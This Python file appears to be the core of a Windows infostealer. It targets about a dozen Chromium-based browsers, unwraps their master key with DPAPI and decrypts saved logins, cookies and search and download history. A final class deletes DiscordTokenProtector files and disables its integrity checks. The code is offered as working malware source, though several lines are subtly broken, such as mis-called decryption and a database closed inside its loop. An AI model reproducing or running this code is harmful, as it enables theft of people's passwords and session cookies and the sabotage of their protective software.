import os
import json
import base64
import win32crypt
import sqlite3
import shutil
import string
import random

from Crypto.Cipher import AES

local = os.environ["localappdata"]
roaming = os.environ["appdata"]
temp = os.environ["temp"]

browsers_data = {
    "Brave": local + "\\BraveSoftware\\Brave-Browser\\User Data",
    'Opera': roaming + '\\Opera Software\\Opera Stable',
    'Opera GX': roaming + '\\Opera Software\\Opera GX Stable',
    'Amigo': local + '\\Amigo\\User Data',
    'Torch': local + '\\Torch\\User Data',
    'Kometa': local + '\\Kometa\\User Data',
    'Orbitum': local + '\\Orbitum\\User Data',
    'CentBrowser': local + '\\CentBrowser\\User Data',
    '7Star': local + '\\7Star\\7Star\\User Data',
    'Sputnik': local + '\\Sputnik\\Sputnik\\User Data',
    'Vivaldi': local + '\\Vivaldi\\User Data',
    'Chrome SxS': local + '\\Google\\Chrome SxS\\User Data',
    'Microsoft Edge': local + '\\Microsoft\\Edge\\User Data',
    'Uran': local + '\\uCozMedia\\Uran\\User Data',
    'Yandex': local + '\\Yandex\\YandexBrowser\\User Data',
    'Iridium': local + '\\Iridium\\User Data'
}

browsers = {
    'Opera': roaming + '\\Opera Software\\Opera Stable',
    'Opera GX': roaming + '\\Opera Software\\Opera GX Stable',
    'Amigo': local + '\\Amigo\\User Data',
    'Torch': local + '\\Torch\\User Data',
    'Kometa': local + '\\Kometa\\User Data',
    'Orbitum': local + '\\Orbitum\\User Data',
    'CentBrowser': local + '\\CentBrowser\\User Data',
    '7Star': local + '\\7Star\\7Star\\User Data',
    'Sputnik': local + '\\Sputnik\\Sputnik\\User Data',
    'Chrome SxS': local + '\\Google\\Chrome SxS\\User Data',
}

browsers_profile = {
    'Vivaldi': local + '\\Vivaldi\\User Data',
    'Microsoft Edge': local + '\\Microsoft\\Edge\\User Data',
    'Yandex': local + '\\Yandex\\YandexBrowser\\User Data',
    'Iridium': local +'\\Iridium\\User Data',
    'Uran': local + '\\uCozMedia\\Uran\\User Data',
    'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data',
    'Chrome': local + "\\Google\\Chrome\\User Data"
}

class Extract:
    def __init__(self, browserLocalState: str) -> None:
        self.key = self.getKey(browserLocalState)


    def getKey(self, path: str):
        with open(path, "r") as f:
            localstate = json.loads(f.read())

            encryption_key = base64.b64decode(
                localstate["os_crypt"]["encrypted_key"])
            
            encryption_key = encryption_key[5:]
            return win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1]
        
    def _decrypter(self, value: bytes):
        try:
            iv = value[3:15]
            value = value[15:]
            
            cipher = AES.new(self.key, AES.MODE_GCM, iv)
            
            return cipher.decrypt(value)[:-16].decode()
        
        except:            
        
            try:
                return str(win32crypt.CryptUnprotectData(value, None, None, None, 0)[1])
            except:
                return "None"
            
    def extractPasswd(self, path: str) -> dict:
        creds = {}

        tempfile = f"{temp}\\{random.choices(string.ascii_lowercase)}"

        try:
            shutil.copy(path, tempfile)
            db = sqlite3.connect(tempfile)
            cursor = db.cursor()
            cursor.execute(
                "select origin_url, action_url, username_value, password_value from logins")
            
            for row in cursor.fetchall():
                main_url = row[0]
                login_page_url = row[1]
                username = row[2]
                password = Extract._decrypter(row[3], self.key)
                
                creds[main_url] = {"Login page": login_page_url, "username": username, "password": password}
                
                db.close()

        except FileNotFoundError:
            return "Null"

        finally: os.remove(tempfile)

        return creds
    
    def extractHistory(self, path: str):
        terms = []
        visited = []
        downloads = {}
        history = {"terms": terms, "download": downloads, "visited": visited}

        tempfile = f"{temp}\\{random.choices(string.ascii_lowercase)}"

        try:
            shutil.copy(path, tempfile)
            db = sqlite3.connect(tempfile)
            cursor = db.cursor()

            cursor.execute("select term from keyword_search_terms")

            for row in cursor.fetchall():
                terms.append(row[0])
                
            cursor.execute("select current_path, tab_url from downloads")

            for row in cursor.fetchall():
                downloads[row[0]] = row[1]
            
            cursor.execute("select url from downloads_url_chains")

            for row in cursor.fetchall():
                visited.append(row[0])

            cursor.close()
            db.close()
        
        finally:
            os.remove(tempfile)

        return history
    
    def extractCookies(self, orginal_path: str):
        cookies = {}

        tempfile = f"{temp}\\{random.choices(string.ascii_lowercase)}"

        try:
            if os.path.exists(f"{orginal_path}\\Network"):
                path = orginal_path + "\\" + "Network" + "\\" + "Cookies"
            
            else:
                path = orginal_path + "\\" + "Cookies"

            shutil.copy(path, tempfile)

            db = sqlite3.connect(path)
            cursor = db.cursor()
            
            cursor.execute("select host_key, name, encrypted_value from cookies")

            for row in cursor.fetchall():
                cookies[row[0]] = {row[1]: Extract._decrypter(row[2], self.key)}

            cursor.close()
            db.close()

        finally:
            os.remove(tempfile)

        return cookies
    
class Anti_tokenprotector:
    def killprotector():
        path = f"{roaming}\\DiscordTokenProtector\\"
        config = path + "config.json"

        if not os.path.exists(path):
            return

        for process in ["DiscordTokenProtector.exe", "ProtectionPayload.dll", "secure.dat"]:
            try:
                os.remove(path + process)
            except FileNotFoundError:
                pass

        if os.path.exists(config):
            with open(config, errors="ignore") as f:
                try:
                    item = json.load(f)
                except json.decoder.JSONDecodeError:
                    return
                item['auto_start'] = False
                item['auto_start_discord'] = False
                item['integrity'] = False
                item['integrity_allowbetterdiscord'] = False
                item['integrity_checkexecutable'] = False
                item['integrity_checkhash'] = False
                item['integrity_checkmodule'] = False
                item['integrity_checkscripts'] = False
                item['integrity_checkresource'] = False
                item['integrity_redownloadhashes'] = False
                item['iterations_iv'] = 364
                item['iterations_key'] = 457
                item['version'] = 69420

            with open(config, 'w') as f:
                json.dump(item, f, indent=2, sort_keys=True)